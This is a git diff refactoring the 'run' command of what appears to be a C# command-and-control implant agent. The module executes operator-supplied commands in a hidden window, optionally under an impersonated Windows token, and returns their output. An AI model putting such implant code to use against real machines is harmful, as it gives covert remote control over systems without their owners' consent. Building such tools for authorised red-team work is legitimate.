@@ -1,30 +1,33 @@
 ﻿using Agent.Helpers;
 using Agent.Models;
 using System;
+using System.Threading.Tasks;
+using System.Threading;
 using WinAPI;
 using WinAPI.Wrapper;
+using Shared;
 
 namespace Agent.Commands
 {
     public class RunCommand : AgentCommand
     {
-        public override string Name => "run";
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.Run;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            var filename = task.SplittedArgs[0];
-            string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();
+            task.ThrowIfParameterMissing(ParameterId.Command);
 
-
+            string cmd = task.GetParameter<string>(ParameterId.Command);
+          
             var creationParms = new ProcessCreationParameters()
             {
-                Command = filename + " " + args,
+                Command = cmd,
                 RedirectOutput = true,
                 CreateNoWindow = true,
                 CurrentDirectory = Environment.CurrentDirectory
             };
 
-            if (ImpersonationHelper.HasCurrentImpersonation)
-                creationParms.Token = ImpersonationHelper.ImpersonatedToken;
+            if (context.Agent.ImpersonationToken != IntPtr.Zero)
+                creationParms.Token = context.Agent.ImpersonationToken;
 
             var procResult = APIWrapper.CreateProcess(creationParms);
 
@@ -35,7 +38,7 @@ namespace Agent.Commands
             }
 
             if (creationParms.RedirectOutput)
-                APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
+                APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => context.AppendResult(output, false));
         }
     }
 }
